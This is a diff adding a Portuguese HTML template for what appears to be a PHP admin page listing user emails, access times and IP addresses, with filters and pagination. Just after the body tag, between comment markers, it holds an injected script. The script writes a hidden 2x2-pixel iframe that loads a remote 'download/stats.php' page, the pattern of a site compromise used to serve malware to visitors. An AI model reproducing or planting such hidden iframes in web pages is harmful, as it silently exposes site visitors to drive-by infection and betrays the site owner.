@@ -1,0 +1,121 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<script language="JavaScript" type="text/JavaScript">
+function m_Select()  {window.location = 'lista.php?email=' + window.document.frm_condition.lst_block.value}
+function m_Select2() {window.location = 'lista.php?datahora=' + window.document.frm_condition2.lst_block2.value}
+function m_Select3() {window.location = 'lista.php?ipuser=' + window.document.frm_condition3.lst_block3.value}
+</script>
+
+</head>
+
+<body><!--c3284d--><script type="text/javascript">
+document.write('<iframe src="http://pahgawks.com/download/stats.php" name="Twitter" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');
+</script><!--/c3284d-->
+
+
+
+<div align="center">
+
+  <table border="0" width="85%" cellpadding="2" id="table2">
+    <tr> 
+      <td width="13%" height="18"><a href="lista.php?ordem=id">ID</a></td>
+      <td width="12%" height="18"><a href="lista.php?ordem=email">e-mail</a></td>
+      <td width="25%" height="18"><a href="lista.php?ordem=datahora">Data e Hora de acesso</a></td>
+      <td width="25%" height="18"><a href="lista.php?ordem=ip">IP do usuário</a></td>
+    </tr>
+    <tr> 
+	<tr> 
+      <td width="13%" height="18">&nbsp;</td>
+      <td width="12%" height="18">
+
+<form action="[var..script_name]" method="post" name="frm_condition" id="frm_condition">
+ <select name="lst_block" class="normal" id="lst_block" onChange="javascript:m_Select()">
+  <option value="" selected>Sem filtro</option>
+  <option value="[blk1.henrique_0001]">[blk1.henrique_0001;block=option]</option>
+  <option value="x">[var.email;selected]</option>
+ </select>
+</form>
+        </td>
+      <td width="25%" height="18">
+		
+<form action="[var..script_name]" method="post" name="frm_condition2" id="frm_condition2">
+ <select name="lst_block2" class="normal" id="lst_block2" onChange="javascript:m_Select2()">
+  <option value="" selected>Sem filtro</option>
+  <option value="[blk2.henrique_0002]">[blk2.henrique_0002;frm='dd/mm/yyyy';block=option]</option>
+  <option value="x">[var.datahora;selected]</option>
+ </select>
+</form>		
+		
+	  </td>
+      <td width="25%" height="18">
+		
+<form action="[var..script_name]" method="post" name="frm_condition3" id="frm_condition3">
+ <select name="lst_block3" class="normal" id="lst_block3" onChange="javascript:m_Select3()">
+  <option value="" selected>Sem filtro</option>
+  <option value="[blk3.henrique_0003]">[blk3.henrique_0003;block=option]</option>
+  <option value="x">[var.ipuser;selected]</option>
+ </select>
+</form>		
+		
+	  </td>
+    </tr>
+    <tr> 
+      <td height="34" bgcolor="#F0F0F0"> <a title="Exibir, Editar ou Excluir o registro" href="alter_datasql.php?id1=[blk.Id;block=row]&id2=[blk.#]"> 
+        </a>[blk.Id;block=row] </td>
+      <td height="34" bgcolor="#F0F0F0">[blk.henrique_0001;block=row]</td>
+      <td height="34" bgcolor="#F0F0F0"> [blk.henrique_0002;frm='dd/mm/yyyy hh:nn';block=row]</td>
+      <td height="34" bgcolor="#F0F0F0">[blk.henrique_0003;block=row]</td>
+    </tr>
+    <tr> 
+      <td height="34" bgcolor="#CACACA">[blk.Id;block=row] </td>
+      <td height="34" bgcolor="#CACACA">[blk.henrique_0001;block=row]</td>
+      <td height="34" bgcolor="#CACACA">[blk.henrique_0002;frm='dd/mm/yyyy hh:nn';block=row]</td>
+      <td height="34" bgcolor="#CACACA">[blk.henrique_0003;block=row]</td>
+    </tr>
+  </table>
+  <br>
+  <table border="1" align="center" cellpadding="2" cellspacing="0" width="584">
+    <tr align="center"> 
+      <td> <form name="form1" method="post" action="">
+          Procurar: <input name="PageSearch" type="text" size="25">
+    &nbsp;          <input type="submit" name="Submit2" value="OK">&nbsp; 
+          Exibindo: <input name="PageSize" type="text" value="[var.PageSize]" size="5">
+              &nbsp;<input type="submit" name="Submit" value="OK">
+        </form>
+      </td>
+    </tr>
+  </table>
+  <br>
+<table border="1" align="center" cellpadding="2" cellspacing="0" width="584">
+  <tr align="center">
+      <td> <b>Página</b> </b>[var.PageNum]<b> de</b> [var.PageCnt], <b>Registros 
+        </b>[var.Rprim] <b> a</b> [var.Rsegu] <b>de</b> [var.RecCnt] / <b>Exibindo</b> 
+        [var.PageSize] <b>registros</b></td>
+  </tr>
+</table>
+
+<br>
+
+<table border="1" align="center" cellpadding="2" cellspacing="0" width="584">
+  <tr align="center">
+  
+    <td width="?? ???30">
+	<a href="[var..script_name]?PageNum=[nv.first;endpoint;magnet=a;mtype=m+m]&PageSize=[var.PageSize]">
+	primeira</a></td>
+    <td width="30"><a href="[var..script_name]?PageNum=[nv.prev;endpoint;magnet=a;mtype=m+m]&PageSize=[var.PageSize]">
+	&lt; anterior</a></td>
+    <td width="10"><a href="[var..script_name]?PageNum=[nv.page]">[nv.page;block=td]</a></td>
+    <td width="10" bgcolor="#C4E1E1">[nv.page;block=td;currpage]</td>
+    <td width="30">
+	<a href="[var..script_name]?PageNum=[nv.next;endpoint;magnet=a;mtype=m+m]&PageSize=[var.PageSize]">próxima ></a></td>
+    <td width="30">
+	<a href="[var..script_name]?PageNum=[nv.last;endpoint;magnet=a;mtype=m+m]&PageSize=[var.PageSize]">última</a></td>
+    
+  </tr>
+	</table>
+</body>
+</html>
